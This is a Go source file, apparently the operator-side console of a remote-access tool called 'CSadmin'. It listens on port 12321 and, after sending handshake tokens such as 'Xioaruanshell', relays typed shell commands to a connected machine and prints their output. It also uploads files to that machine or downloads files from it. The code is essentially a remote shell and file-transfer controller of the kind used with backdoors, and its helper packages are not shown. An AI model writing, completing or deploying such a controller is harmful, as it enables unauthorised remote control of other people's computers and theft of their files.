
package action

import (
	"CSadmin/function"
	"CSadmin/upload"
	"fmt"
	"net"
	"strings"
	"time"
)

var port string
var ip string
var shell string
var ok string
var check string
var file string

func Conn_ip() {

	port := "12321"
	conn := function.Lis_net(port)
connall:
	for {
		choose := SwitchChoose()
		// fmt.Print(choose)
		switch choose {
		case "1":
			code_check_shell := "Xioaruanshell"
			function.Write_conn(conn, code_check_shell)
			for {
				pwd := function.Read_conn(conn)
				pwd = strings.Replace(pwd, "\n", "", -1)
				fmt.Printf("%v >", pwd)
				function.Scanf(&shell)
				if shell == "exit()" {
					check = "no"
					function.Write_conn(conn, check)
					goto connall
				}
				chechkongeg(shell, conn, pwd)
				function.Write_conn(conn, shell)
				output := function.Read_conn(conn)
				fmt.Println(output)
				ok = "ok"
				function.Write_conn(conn, ok)
			}
		case "2":
			code_check_shell := "XioaruanUpload"
			function.Write_conn(conn, code_check_shell)
			for {

				choose := FileChoose()
				function.Write_conn(conn, choose)

				switch choose {

				case "1":
					files := "File"
					fmt.Printf("%v >", files)
					function.Scanf(&file)
					if file == "exit()" {
						check = "no"
						function.Write_conn(conn, check)
						goto connall
					}
					code := upload.CheckFile(file)
					if code == "no" {
						fmt.Println("文件不存在")
						continue
					}
					filebase := upload.CheckFileName(file)
					fmt.Println(filebase)
					function.Write_conn(conn, filebase)
					time.Sleep(time.Microsecond * 200)
					upload.Doupload(file, conn)
				case "2":
					pwd := function.Read_conn(conn)
					fmt.Println(pwd)
					files := "File"
					fmt.Printf("%v >", files)
					function.Scanf(&file)
					if file == "exit()" {
						check = "no"
						function.Write_conn(conn, check)
						goto connall
					}
					time.Sleep(time.Microsecond * 200)
					function.Write_conn(conn, file)
					upload.CreateFile(conn, file)
				default:
					fmt.Println("还没做出来")
					break
				}
			}
		default:
			fmt.Println("还没有开发哦~")
			goto connall
		}
	}
	// defer conn.Close()

}

func chechkongeg(shell string, conn net.Conn, pwd string) {
	if shell == "" {
		fmt.Println("命令为空")
		fmt.Printf("%v >", pwd)
		function.Scanf(&shell)
		function.Write_conn(conn, shell)

		chechkongeg(shell, conn, pwd)
	}
}


